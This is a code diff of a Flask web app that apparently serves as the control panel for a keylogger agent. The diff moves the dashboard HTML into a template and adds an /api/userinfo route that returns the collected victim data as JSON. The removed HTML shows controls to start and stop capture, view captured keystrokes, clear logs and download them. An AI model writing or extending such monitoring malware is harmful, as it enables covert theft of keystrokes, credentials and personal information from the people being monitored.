@@ -1,8 +1,10 @@
 from flask import Flask, render_template_string, request, jsonify
+from flask import render_template
 import requests
 import os
 import json
 from datetime import datetime
+
 
 app = Flask(__name__)
 PAYLOAD_API = "http://127.0.0.1:5000"  # Agent’s port
@@ -14,136 +16,7 @@ latest_display_log = ""
 
 # --- HTML Templates ---
 CONTROL_PANEL_HTML = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Agent Control Panel</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #f4f4f4;
-            margin: 0;
-            padding: 0;
-            color: #333;
-        }
 
-        .navbar {
-            background-color: #333;
-            padding: 20px;
-        }
-
-        .navbar h1 {
-            color: #fff;
-            margin: 0 0 15px 0;
-            font-size: 24px;
-        }
-
-        .button-group {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-
-        .button-group button {
-            background-color: #4CAF50;
-            border: none;
-            color: white;
-            padding: 10px 16px;
-            text-align: center;
-            font-size: 14px;
-            cursor: pointer;
-            border-radius: 4px;
-            transition: background-color 0.3s;
-        }
-
-        .button-group button:hover {
-            background-color: #45a049;
-        }
-
-        .container {
-            padding: 30px;
-        }
-
-        h2 {
-            color: #222;
-            margin-top: 0;
-        }
-
-        pre {
-            background: white;
-            padding: 15px;
-            border: 1px solid #ccc;
-            height: 60vh;
-            overflow-y: auto;
-            white-space: pre-wrap;
-            border-radius: 5px;
-        }
-
-        @media (max-width: 600px) {
-            .button-group {
-                flex-direction: column;
-            }
-
-            .button-group button {
-                width: 100%;
-            }
-        }
-    </style>
-   <script>
-    function controlAgent(action) {
-        fetch("/" + action, { method: "POST" })
-        .then(() => alert("Agent " + action + "ed"))
-        .catch(err => alert("Error: " + err));
-    }
-
-    function fetchPeople() {
-        const unique = new Date().getTime();
-        fetch("/people?nocache=" + unique)
-        .then(res => res.text())
-        .then(data => {
-            document.getElementById("people-output").innerText = data || "[No activity captured yet]";
-        })
-        .catch(err => console.error("Error fetching data:", err));
-    }
-
-    function reloadSession() {
-        fetch("/reload", { method: "POST" })
-        .then(() => {
-            document.getElementById("people-output").innerText = "[Log cleared. Start typing again.]";
-            alert("Log cleared");
-        })
-        .catch(err => alert("Error: " + err));
-    }
-
-    function downloadLog() {
-        window.location.href = "/download";
-    }
-
-   
-    const interval = 5000;
-    setInterval(fetchPeople, interval);
-</script>
-
-</head>
-<body>
-    <div class="navbar">
-        <h1>Agent Control Panel</h1>
-        <div class="button-group">
-            <button onclick="controlAgent('start')">Start Capture</button>
-            <button onclick="controlAgent('stop')">Stop Capture</button>
-            <button onclick="fetchPeople()">Get Captured Data</button>
-            <button onclick="reloadSession()">Reload & Clear Log</button>
-            <button onclick="downloadLog()">Download Log</button>
-            <button onclick="window.location.href='/userinfo'">View User Info</button>
-        </div>
-    </div>
-
-    <div class="container">
-        <h2>Captured Keystrokes</h2>
-        <pre id="people-output">[Click "Get Captured Data" to refresh]</pre>
-    </div>
-</body>
-</html>
 """
 
 
@@ -184,7 +57,9 @@ USERINFO_HTML = """
 # === Agent Control Routes ===
 @app.route('/')
 def home():
-    return render_template_string(CONTROL_PANEL_HTML)
+    return render_template('index.html')
+
+
 
 @app.route('/start', methods=['POST'])
 def start():
@@ -286,6 +161,21 @@ def userinfo_dashboard():
         return "<h2>No user info collected yet.</h2>"
 
     return render_template_string(USERINFO_HTML, data=all_data)
+
+@app.route('/api/userinfo')
+def get_userinfo_json():
+    all_data = []
+    for filename in sorted(os.listdir(LOG_DIR)):
+        filepath = os.path.join(LOG_DIR, filename)
+        try:
+            with open(filepath, 'r') as f:
+                data = json.load(f)
+                all_data.append(data)
+        except:
+            continue
+
+    return jsonify(all_data)
+
 
 # === Entry Point ===
 if __name__ == '__main__':
